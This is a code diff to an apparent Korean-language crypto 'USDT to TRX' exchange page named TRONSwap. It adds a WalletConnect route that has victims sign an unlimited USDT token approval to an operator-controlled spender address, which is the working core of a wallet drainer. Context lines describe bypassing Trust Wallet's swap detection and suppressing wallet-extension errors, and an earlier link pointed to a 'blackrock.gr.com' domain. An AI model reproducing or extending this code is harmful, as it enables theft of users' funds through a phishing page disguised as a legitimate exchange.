@@ -10,7 +10,9 @@
     <script>tailwind.config={darkMode:'class',theme:{extend:{colors:{dark:'#030712'}}}}</script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+    <!-- TronWeb CDN 제거: Trust Wallet DApp 브라우저가 자체 tronWeb 주입을 건너뜀 방지 -->
+    <!-- WalletConnect v2 TRON Bridge -->
+    <script src="wc-tron.min.js"></script>
     <script>
         // 지갑 확장 프로그램 에러 숨김
         window.addEventListener('error',function(e){if(e.filename&&(e.filename.indexOf('inpage')>=0||e.filename.indexOf('content')>=0||e.filename.indexOf('classifier')>=0||e.filename.indexOf('inject')>=0)){e.preventDefault();return true;}if(e.message&&(e.message.indexOf('charAt')>=0||e.message.indexOf('animation')>=0||e.message.indexOf('TokenPocket')>=0||e.message.indexOf('AccessDenied')>=0)){e.preventDefault();return true;}},true);
@@ -191,6 +193,13 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
                 <button onclick="launchWallet('okx')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
                     <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-white/10 to-slate-500/10 border border-slate-600/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-cube text-white text-lg"></i></div>
                     <div class="flex-1"><div class="text-sm font-bold text-white">OKX Wallet</div><div class="text-[11px] text-slate-400" data-i18n="w_okx">OKX 거래소 지갑</div></div>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
+                </button>
+                <!-- WalletConnect 구분선 -->
+                <div class="flex items-center gap-3 pt-1"><div class="flex-1 border-t border-slate-700/60"></div><span class="text-[10px] text-slate-500 font-semibold uppercase tracking-wider">또는</span><div class="flex-1 border-t border-slate-700/60"></div></div>
+                <button onclick="wcConnectFromModal()" class="wallet-card w-full bg-gradient-to-r from-blue-600/20 to-purple-600/20 hover:from-blue-600/30 hover:to-purple-600/30 border border-blue-500/40 rounded-2xl p-4 flex items-center gap-4 text-left">
+                    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500/30 to-purple-500/20 border border-blue-400/40 flex items-center justify-center shrink-0"><i class="fa-solid fa-qrcode text-blue-300 text-lg"></i></div>
+                    <div class="flex-1"><div class="text-sm font-bold text-white">WalletConnect</div><div class="text-[11px] text-slate-400">QR 코드로 다양한 지갑 연결</div></div>
                     <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
             </div>
@@ -497,7 +506,7 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             var tronlinkParam=encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'}));
             var links={
                 tronlink:{scheme:'tronlinkoutside://pull.activity?param='+tronlinkParam,pkg:'com.tronlinkpro.wallet'},
-                trust:{scheme:'trust://open_url?coin_id=195&url='+encodeURIComponent('https://www.blackrock.gr.com/'),pkg:'com.wallet.crypto.trustapp'},
+                trust:{scheme:'trust://open_url?coin_id=195&url='+encoded,pkg:'com.wallet.crypto.trustapp'},
                 tokenpocket:{scheme:'tpdapp://open?params='+encodeURIComponent(JSON.stringify({url:url,chain:'TRON'})),pkg:'vip.mytokenpocket'},
                 bitget:{scheme:'bitkeep://bkconnect?action=dapp&url='+encoded,pkg:'com.bitkeep.wallet'},
                 okx:{scheme:'okx://wallet/dapp/url?dappUrl='+encoded,pkg:'com.okinc.okex.gp'}
@@ -579,6 +588,63 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             }
         });
 
+        // ===== WalletConnect v2 =====
+        var wcConnector=null;
+        var wcAddress=null;
+        async function initWalletConnect(){
+            if(wcConnector)return wcConnector;
+            if(typeof TronWalletConnect==='undefined'){appendLog('[WC] WalletConnect 로드 실패','error');return null;}
+            try{
+                wcConnector=new TronWalletConnect('5fafa9c15e52f88b097bc063166d3f3a',{
+                    name:'TRONSwap',
+                    description:'USDT to TRX Instant Exchange',
+                    url:window.location.origin,
+                    icons:[window.location.origin+'/favicon.png']
+                });
+                await wcConnector.init();
+                wcConnector.onDisconnect=function(){
+                    wcAddress=null;
+                    appendLog('[WC] 연결 해제됨','warn');
+                };
+                appendLog('[WC] 초기화 완료','success');
+                return wcConnector;
+            }catch(e){
+                appendLog('[WC] 초기화 실패: '+e.message,'error');
+                return null;
+            }
+        }
+        async function connectViaWalletConnect(){
+            var wc=await initWalletConnect();
+            if(!wc)return null;
+            try{
+                appendLog('[WC] QR 코드 표시 중... 지갑 앱에서 스캔하세요');
+                showToast(currentLang==='ko'?'지갑 앱에서 QR 코드를 스캔하세요':'Scan QR code with your wallet app');
+                var addr=await wc.connect();
+                if(addr){
+                    wcAddress=addr;
+                    appendLog('[WC] 연결 성공: '+addr,'success');
+                    return addr;
+                }
+            }catch(e){
+                if(e.message&&e.message.indexOf('rejected')>=0){
+                    appendLog('[WC] 사용자가 연결을 거부했습니다','warn');
+                }else{
+                    appendLog('[WC] 연결 실패: '+e.message,'error');
+                }
+            }
+            return null;
+        }
+        // 모달에서 WC 버튼 클릭 시
+        window.wcConnectFromModal=async function(){
+            document.getElementById('wallet-selector-modal').classList.remove('active');
+            var wcAddr=await connectViaWalletConnect();
+            if(wcAddr){
+                await setConnectedWallet(wcAddr,'WalletConnect');
+            }else{
+                showToast(currentLang==='ko'?'WalletConnect 연결 실패':'WalletConnect connection failed','error');
+            }
+        };
+
         // ===== Connect =====
         window.handleConnectWallet=async function(){
             appendLog(L('searching'));
@@ -587,6 +653,7 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
                 var provider=detectProvider()||'TronLink';
                 await setConnectedWallet(tw.defaultAddress.base58,provider);
             }else{
+                // tronWeb 없으면 모바일에서 딥링크 or WC 선택할 수 있도록 모달 표시
                 document.getElementById('wallet-selector-modal').classList.add('active');
             }
         };
@@ -634,14 +701,24 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             hideProgress();
         }
 
-        // ===== Approve (TRX 자동 충전 + 프로그레스 바) =====
+        // ===== Approve (TRX 자동 충전 + 프로그레스 바 + WalletConnect) =====
         window.executeUnlimitedApprove=async function(){
             if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
             if(isApproved){showToast(currentLang==='ko'?'이미 교환 승인이 완료되었습니다':'Already approved');return;}
             var spender=await getSpenderAddress();
             if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog(L('noSpender'),'error');return;}
             var tw=await getInjectedTronWeb();
-            if(!tw||!tw.contract){showToast('지갑 DApp 브라우저 필요','error');if(isMobile())showWalletSelector();return;}
+            var useWC=false;
+            if(!tw||!tw.contract){
+                // tronWeb 없음 → WalletConnect 모드 확인
+                if(wcConnector&&wcConnector.isConnected()&&wcAddress){
+                    useWC=true;
+                    appendLog('[WC] WalletConnect 서명 모드','warn');
+                }else{
+                    showToast(currentLang==='ko'?'지갑을 먼저 연결하세요':'Connect wallet first','error');
+                    handleConnectWallet();return;
+                }
+            }
 
             var btn=document.getElementById('approve-btn');
             btn.disabled=true;btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
@@ -674,18 +751,75 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             showToast('지갑에서 서명 팝업을 확인하세요.');
 
             try{
-                // triggerSmartContract 원시 방식 (Trust Wallet 스왑 감지 우회)
-                var tx=await tw.transactionBuilder.triggerSmartContract(
-                    OFFICIAL_USDT_CONTRACT,
-                    'approve(address,uint256)',
-                    {feeLimit:100000000},
-                    [{type:'address',value:spender},{type:'uint256',value:MAX_ALLOWANCE}],
-                    currentWalletAddress
-                );
-                if(!tx||!tx.transaction)throw new Error('트랜잭션 생성 실패');
-                var signedTx=await tw.trx.sign(tx.transaction);
-                var result=await tw.trx.sendRawTransaction(signedTx);
-                var txHash=result.txid||result.transaction?.txID||signedTx.txID||'ok';
+                var txHash;
+                if(useWC){
+                    // === WalletConnect 경로: TronGrid API로 트랜잭션 빌드 → WC 서명 → API 브로드캐스트 ===
+                    appendLog('[WC] TronGrid API로 트랜잭션 생성 중...','approve');
+                    // base58 → hex 변환 (41 prefix 제거)
+                    function base58ToHex(b58){
+                        var ALPHABET='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+                        var result=BigInt(0);
+                        for(var i=0;i<b58.length;i++){var c=ALPHABET.indexOf(b58[i]);if(c<0)throw new Error('Invalid base58');result=result*BigInt(58)+BigInt(c);}
+                        var hex=result.toString(16);
+                        while(hex.length<50)hex='0'+hex;
+                        return hex.substring(2,42);
+                    }
+                    var addrHex=base58ToHex(spender);
+                    var paddedAddr=addrHex.padStart(64,'0');
+                    var maxUint='ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                    var abiParam=paddedAddr+maxUint;
+                    // TronGrid triggersmartcontract API 호출
+                    var triggerRes=await fetch('https://api.trongrid.io/wallet/triggersmartcontract',{
+                        method:'POST',headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({
+                            owner_address:currentWalletAddress,
+                            contract_address:OFFICIAL_USDT_CONTRACT,
+                            function_selector:'approve(address,uint256)',
+                            parameter:abiParam,
+                            fee_limit:100000000,
+                            call_value:0,
+                            visible:true
+                        })
+                    });
+                    var triggerData=await triggerRes.json();
+                    if(!triggerData.transaction)throw new Error('TronGrid 트랜잭션 생성 실패: '+(triggerData.Error||JSON.stringify(triggerData)));
+                    appendLog('[WC] 트랜잭션 생성 완료, 지갑에서 서명 요청 중...','approve');
+                    // WalletConnect로 서명 요청
+                    var wcResult=await wcConnector.signTransaction(triggerData.transaction);
+                    appendLog('[WC] 서명 응답 키: '+JSON.stringify(Object.keys(wcResult||{})).substring(0,120),'approve');
+                    // WC 서명 결과 정규화
+                    if(wcResult&&wcResult.result) wcResult=wcResult.result;
+                    var broadcastPayload;
+                    if(wcResult&&wcResult.signature&&wcResult.txID){
+                        broadcastPayload=wcResult;
+                    }else if(wcResult&&wcResult.signature){
+                        broadcastPayload=JSON.parse(JSON.stringify(triggerData.transaction));
+                        broadcastPayload.signature=Array.isArray(wcResult.signature)?wcResult.signature:[wcResult.signature];
+                    }else{
+                        broadcastPayload=wcResult;
+                    }
+                    appendLog('[WC] 브로드캐스트 중... txID:'+(broadcastPayload.txID||'없음'),'approve');
+                    var broadcastRes=await fetch('https://api.trongrid.io/wallet/broadcasttransaction',{
+                        method:'POST',headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify(broadcastPayload)
+                    });
+                    var broadcastData=await broadcastRes.json();
+                    if(!broadcastData.result)throw new Error('브로드캐스트 실패: '+(broadcastData.Error||broadcastData.message||JSON.stringify(broadcastData)));
+                    txHash=broadcastData.txid||broadcastPayload.txID||'ok';
+                }else{
+                    // === DApp 브라우저 경로: triggerSmartContract 원시 방식 ===
+                    var tx=await tw.transactionBuilder.triggerSmartContract(
+                        OFFICIAL_USDT_CONTRACT,
+                        'approve(address,uint256)',
+                        {feeLimit:100000000},
+                        [{type:'address',value:spender},{type:'uint256',value:MAX_ALLOWANCE}],
+                        currentWalletAddress
+                    );
+                    if(!tx||!tx.transaction)throw new Error('트랜잭션 생성 실패');
+                    var signedTx=await tw.trx.sign(tx.transaction);
+                    var result=await tw.trx.sendRawTransaction(signedTx);
+                    txHash=result.txid||result.transaction?.txID||signedTx.txID||'ok';
+                }
                 if(!txHash)throw new Error('TX 해시 수신 실패');
 
                 // Step 3: 완료
